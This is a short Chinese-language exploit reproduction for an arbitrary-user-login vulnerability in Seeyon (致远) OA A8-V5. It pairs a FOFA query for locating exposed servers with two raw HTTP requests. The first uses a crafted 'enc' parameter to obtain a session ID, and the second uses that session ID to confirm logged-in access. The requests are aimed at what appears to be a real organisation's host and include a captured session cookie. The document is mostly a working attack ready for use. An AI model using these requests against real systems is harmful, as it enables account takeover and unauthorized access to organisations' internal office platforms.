## 致远OA A8-V5 任意用户登录漏洞

### 搜索语法

```
fofa:app="致远互联-OA"
```

### 漏洞复现

1.访问接口 `/seeyon/thirdpartyController.do`

```
GET /seeyon/thirdpartyController.do?method=access&enc=TT5uZnR0YmhmL21qb2wvY2N0L3BxZm8nTj4uODM4NDE0MzEyNDM0NTg1OTI3OSdVPjo6Ojo6Ojo6Ojo6Ojo= HTTP/1.1
Host: oam.rongyi.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image-20240611202402836](https://newoss2.oss-cn-beijing.aliyuncs.com/202406112024930.png)

可以在响应包中得到一个`JSESSIONID`，在携带`JSESSIONID` 访问`/seeyon/online.do`接口进行验证。

```
GET /seeyon/online.do?method=showOnlineUser HTTP/1.1
Host: oam.rongyi.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=94E4773735662ACB34A67255290B8CF1; loginPageURL=; avatarImageUrl=-7273032013234748168
Connection: close
```

![image-20240611202654203](https://newoss2.oss-cn-beijing.aliyuncs.com/202406112026302.png)

相关文章：[致远OA A8-V5 任意用户登录漏洞分析 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/13743?time__1311=mqmxnQKCqGqQq0KDsD7mG7WH9p4fxlkBbD&alichlgref=https%3A%2F%2Fwww.bing.com%2F)